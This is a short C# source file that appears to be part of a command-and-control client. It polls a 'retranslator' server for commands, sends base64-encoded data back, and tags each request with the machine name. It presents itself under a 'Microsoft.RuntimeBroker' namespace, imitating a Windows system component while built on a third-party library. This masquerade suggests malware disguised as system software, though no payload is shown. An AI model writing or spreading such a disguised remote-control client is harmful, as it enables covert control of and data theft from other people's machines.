using System.Net.Http.Headers;
using System.Text.Json;
using Kalantyr.Web;
using Microsoft.RuntimeBroker.Models.Commands;

namespace Microsoft.RuntimeBroker.InternalServices.Impl;

internal class CommandHttpClient: HttpClientBase
{
    public CommandHttpClient(IHttpClientFactory httpClientFactory, IRequestEnricher requestEnricher) : base(httpClientFactory, requestEnricher)
    {
    }

    public async Task<CommandBase> ResolveCommandAsync(CancellationToken cancellationToken)
    {
        var response = await Post<ResultDto<byte[]>>("retranslator/resolveCommand", null, cancellationToken);
        return CommandBase.Deserialize(response.Result);
    }

    public async Task<ResultDto<bool>> SendCommandAsync(uint commandId, byte[] data, CancellationToken cancellationToken)
    {
        var body = JsonSerializer.Serialize(Convert.ToBase64String(data));
        return await Post<ResultDto<bool>>($"retranslator/receiveCommand?id={commandId}", body, cancellationToken);
    }
}

internal class CommandRequestEnricher: IRequestEnricher
{
    public void Enrich(HttpRequestHeaders requestHeaders)
    {
        requestHeaders.Add(nameof(Environment.MachineName), Environment.MachineName);
    }
}